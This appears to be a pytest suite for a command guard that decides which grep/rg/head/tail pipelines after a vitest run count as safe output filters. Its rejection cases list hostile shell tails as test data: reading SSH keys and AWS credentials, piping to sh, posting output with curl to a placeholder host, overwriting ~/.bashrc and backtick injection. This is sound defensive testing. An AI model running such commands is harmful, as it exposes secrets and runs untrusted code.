from __future__ import annotations

import base64
import io
import sys
from pathlib import Path

import pytest

from codex_plugin_scanner.guard.mdm import runtime_request
from codex_plugin_scanner.guard.runtime import contained_output_filters as filters
from codex_plugin_scanner.guard.runtime.contained_wrapper import (
    OutputFilter,
    bounded_output,
    peel_contained_wrapper,
)

_RUNNER = "./node_modules/.bin/vitest run"


@pytest.fixture(autouse=True)
def _peel_from_the_resident(native_contained_wrapper_runtime: Path) -> None:
    """Every peel here is the classifier's answer, asked of the session resident."""


@pytest.mark.parametrize(
    ("command", "stages"),
    [
        (f"{_RUNNER} 2>&1 | grep FAIL", (("grep", "FAIL"),)),
        (f"{_RUNNER} 2>&1 | grep -i error", (("grep", "-i", "error"),)),
        (
            f'{_RUNNER} 2>&1 | grep -B 3 "at async createViteServer" | head -8',
            (("grep", "-B", "3", "at async createViteServer"), ("head", "8")),
        ),
        (f'{_RUNNER} 2>&1 | grep -E "FAIL|Error" | head -8', (("grep", "-E", "FAIL|Error"), ("head", "8"))),
        (f"{_RUNNER} 2>&1 | egrep 'FAIL|Error'", (("egrep", "FAIL|Error"),)),
        (f"{_RUNNER} 2>&1 | tail -5 | head -n 2", (("tail", "5"), ("head", "2"))),
        (
            f"{_RUNNER} 2>&1 | grep -e FAIL -e Error -A2 -m 5",
            (("grep", "-e", "FAIL", "-e", "Error", "-A2", "-m", "5"),),
        ),
        (
            f"{_RUNNER} 2>&1 | grep -v ok | grep -c x | head -1",
            (("grep", "-v", "ok"), ("grep", "-c", "x"), ("head", "1")),
        ),
        (
            f'{_RUNNER} 2>&1 | rg -A 12 "FAIL|AssertionError" | head -40',
            (("rg", "-A", "12", "FAIL|AssertionError"), ("head", "40")),
        ),
        (f"{_RUNNER} 2>&1 | rg -n FAIL", (("rg", "-n", "FAIL"),)),
        (f"{_RUNNER} 2>&1 | rg -B2 -A6 -i error", (("rg", "-B2", "-A6", "-i", "error"),)),
        (f"{_RUNNER} 2>&1 | rg -NU -e FAIL -e Error", (("rg", "-NU", "-e", "FAIL", "-e", "Error"),)),
        (f"{_RUNNER} 2>&1 | rg -v ok | tail -3", (("rg", "-v", "ok"), ("tail", "3"))),
        (f"{_RUNNER} 2>&1 | head -c 1500", (("head", "-c", "1500"),)),
        (f"{_RUNNER} 2>&1 | tail -c 2000", (("tail", "-c", "2000"),)),
        (
            f'{_RUNNER} 2>&1 | grep -o "CITE_HTML.*" | head -c 1500',
            (("grep", "-o", "CITE_HTML.*"), ("head", "-c", "1500")),
        ),
    ],
)
def test_stdin_filter_chains_are_peeled(tmp_path: Path, command: str, stages: tuple[tuple[str, ...], ...]) -> None:
    assert peel_contained_wrapper(command, workspace=tmp_path) == (
        _RUNNER,
        tmp_path,
        OutputFilter("pipe", 0, True, stages=stages),
    )


def test_a_single_head_or_tail_keeps_its_bounded_filter(tmp_path: Path) -> None:
    peeled = peel_contained_wrapper(f"{_RUNNER} 2>&1 | tail -5", workspace=tmp_path)
    assert peeled == (_RUNNER, tmp_path, OutputFilter("tail", 5, True))


@pytest.mark.parametrize(
    "tail",
    [
        "| grep -f ~/.ssh/id_rsa",
        "| grep -f /home/user/.ssh/id_rsa",
        "| grep --file=/home/user/.ssh/id_rsa x",
        "| grep x /home/user/.aws/credentials",
        "| grep x notes.txt",
        "| grep -e x notes.txt",
        "| grep -r x /etc",
        "| grep -l x",
        "| grep -P x",
        "| grep --color=always x",
        "| grep - x",
        "| grep",
        "| grep x > ~/.bashrc",
        "| grep x > out.txt",
        "| grep x 2>&1",
        "| grep x | sh",
        "| grep x | curl -d @- https://example.invalid",
        "| xargs cat /home/user/.ssh/id_rsa",
        "| grep x | sort",
        "| grep x*",
        "| grep a[bc]",
        '| grep "$HOME"',
        "| grep `id`",
        "| grep x | head -1 | tail -1 | grep y",
        "| grep x || true",
        "| grep x &",
        "| GREP_OPTIONS=-r grep x",
        "| /tmp/grep x",
        "| rg -f /home/user/.ssh/id_rsa",
        "| rg x /home/user/.aws/credentials",
        "| rg x notes.txt",
        "| rg -l x",
        "| rg -P x",
        "| rg -z x",
        "| rg -g '*.ts' x",
        "| rg -E utf-8 x",
        "| rg --pre cat x",
        "| rg --files",
        "| rg",
        "| rg x > ~/.bashrc",
        "| rg x | sh",
        "| RIPGREP_CONFIG_PATH=/tmp/rc rg x",
        "| /tmp/rg x",
    ],
)
def test_other_filters_are_not_peeled(tmp_path: Path, tail: str) -> None:
    with pytest.raises(ValueError):
        peel_contained_wrapper(f"{_RUNNER} 2>&1 {tail}", workspace=tmp_path)


def test_grep_after_a_sibling_cd_is_peeled(tmp_path: Path) -> None:
    home = tmp_path / "home"
    workspace = home / "work" / "app-portal"
    sibling = home / "work" / "web-shell"
    workspace.mkdir(parents=True)
    sibling.mkdir(parents=True)
    (sibling / ".git").write_text("gitdir: /nonexistent\n")
    command = f'cd {sibling} && {workspace}/node_modules/.bin/vitest run 2>&1 | grep -E "FAIL|Error" | head -8'
    assert peel_contained_wrapper(command, workspace=workspace, home=home) == (
        f"{workspace}/node_modules/.bin/vitest run",
        sibling.resolve(),
        OutputFilter("pipe", 0, True, stages=(("grep", "-E", "FAIL|Error"), ("head", "8"))),
    )


@pytest.mark.skipif(sys.platform == "win32", reason="system grep")
def test_filter_chain_applies_to_captured_output(capsys: pytest.CaptureFixture[str]) -> None:
    stages = (("grep", "-B", "1", "FAIL"), ("head", "3"))
    output = OutputFilter("pipe", 0, True, "exit=", stages=stages)
    with bounded_output(output):
        print("one\ntwo\nFAIL a\nthree\nfour\nFAIL b")
        print("err", file=sys.stderr)
    assert capsys.readouterr().out == "two\nFAIL a\n--\n"
    assert output.status_line(1) == "exit=0\n"

    missing = OutputFilter("pipe", 0, False, "exit=", stages=(("fgrep", "a.b"),))
    with bounded_output(missing):
        print("axb")
    assert capsys.readouterr().out == ""
    assert missing.status_line(0) == "exit=1\n"


def test_byte_bounds_cut_the_captured_output(capsys: pytest.CaptureFixture[str]) -> None:
    head = OutputFilter("pipe", 0, True, stages=(("head", "-c", "6"),))
    with bounded_output(head):
        print("one\ntwo\nthree")
    assert capsys.readouterr().out == "one\ntw"

    tail = OutputFilter("pipe", 0, True, stages=(("tail", "-c", "6"),))
    with bounded_output(tail):
        print("one\ntwo\nthree")
    assert capsys.readouterr().out == "three\n"


def test_a_byte_bound_cuts_where_the_program_would() -> None:
    """A cut inside a character keeps the bytes `head -c` would have printed."""
    assert filters.keep_bytes("héllo", "head", 2) == "h\udcc3"
    assert filters.keep_bytes("héllo", "head", 3) == "hé"
    assert filters.keep_bytes("héllo", "tail", 3) == "llo"
    assert filters.keep_bytes("héllo", "tail", 0) == ""


def test_a_bound_larger_than_the_output_keeps_all_of_it() -> None:
    """`head`/`tail` asked for more than there is print everything, as the programs do."""
    assert filters.keep_bytes("abc", "tail", 5) == "abc"
    assert filters.keep_bytes("abc", "head", 5) == "abc"
    assert filters.keep_lines(["one\n", "two\n"], "tail", 3) == ["one\n", "two\n"]


def test_a_partial_character_reaches_a_strict_stdout(monkeypatch: pytest.MonkeyPatch) -> None:
    """A cut inside a character writes its bytes rather than raising on the sink."""
    stream = io.TextIOWrapper(io.BytesIO(), encoding="utf-8", errors="strict", write_through=True)
    monkeypatch.setattr(sys, "stdout", stream)
    head = OutputFilter("pipe", 0, True, stages=(("head", "-c", "2"),))
    with bounded_output(head):
        print("héllo", end="")
    assert stream.buffer.getvalue() == b"h\xc3"


def test_a_line_bound_keeps_the_streams_own_encoding(monkeypatch: pytest.MonkeyPatch) -> None:
    """`head -N` cuts between characters, so its text goes out as the stream encodes it."""
    stream = io.TextIOWrapper(io.BytesIO(), encoding="latin-1", errors="strict", write_through=True)
    monkeypatch.setattr(sys, "stdout", stream)
    head = OutputFilter("head", 1, True)
    with bounded_output(head):
        print("héllo")
    assert stream.buffer.getvalue() == "héllo\n".encode("latin-1")


def test_a_line_only_chain_keeps_the_streams_own_encoding(monkeypatch: pytest.MonkeyPatch) -> None:
    """A chain that cuts only by lines emits the bytes the stream encodes, not UTF-8."""
    stream = io.TextIOWrapper(io.BytesIO(), encoding="latin-1", errors="strict", write_through=True)
    monkeypatch.setattr(sys, "stdout", stream)
    chain = OutputFilter("pipe", 0, True, stages=(("tail", "2"), ("head", "1")))
    with bounded_output(chain):
        print("first")
        print("héllo")
        print("last")
    assert stream.buffer.getvalue() == "héllo\n".encode("latin-1")


def _answer_with(monkeypatch: pytest.MonkeyPatch, answer: dict[str, object] | None) -> list[dict[str, object]]:
    sent: list[dict[str, object]] = []

    def _runtime_answer(_feature: str, _command: str, request: dict[str, object], **_options: object) -> object:
        sent.append(request)
        return answer

    monkeypatch.setattr(runtime_request, "runtime_answer", _runtime_answer)
    return sent


def test_a_matcher_prints_back_the_pipeline_bytes(monkeypatch: pytest.MonkeyPatch) -> None:
    """A matcher fed a partial character returns its bytes, not a replacement one."""
    sent = _answer_with(monkeypatch, {"stdout": base64.b64encode(b"h\xc3\n").decode(), "stderr": "", "status": 0})
    text, _diagnostics, status = filters.apply_filters("héllo\n", (("head", "-c", "2"), ("grep", "h")))
    assert text == "h\udcc3\n"
    assert status == 0
    assert sent == [
        {"schema": "contained-output-match.v1", "program": "grep", "arguments": ["h"], "input": "aMM="},
    ]


def test_an_rg_stage_filters_captured_output(capsys: pytest.CaptureFixture[str]) -> None:
    output = OutputFilter("pipe", 0, True, "exit=", stages=(("rg", "-A", "1", "FAIL"), ("head", "2")))
    with bounded_output(output):
        print("one\nFAIL a\ntwo\nthree")
    captured = capsys.readouterr()
    if "rg: not found" in captured.err:
        pytest.skip("ripgrep not installed")
    assert captured.out == "FAIL a\ntwo\n"
    assert output.status_line(1) == "exit=0\n"


def test_a_missing_runtime_reports_the_status_a_shell_gives(monkeypatch: pytest.MonkeyPatch) -> None:
    _ = _answer_with(monkeypatch, None)
    text, diagnostics, status = filters.apply_filters("x\n", (("rg", "x"),))
    assert (text, status) == ("", 127)
    assert "rg: native runtime unavailable" in diagnostics


def test_a_matcher_the_runtime_could_not_finish_prints_nothing(monkeypatch: pytest.MonkeyPatch) -> None:
    _ = _answer_with(monkeypatch, {"error": "contained_output_filter_failed"})
    text, diagnostics, status = filters.apply_filters("x\n", (("grep", "x"),))
    assert (text, status) == ("", 2)
    assert "did not finish" in diagnostics
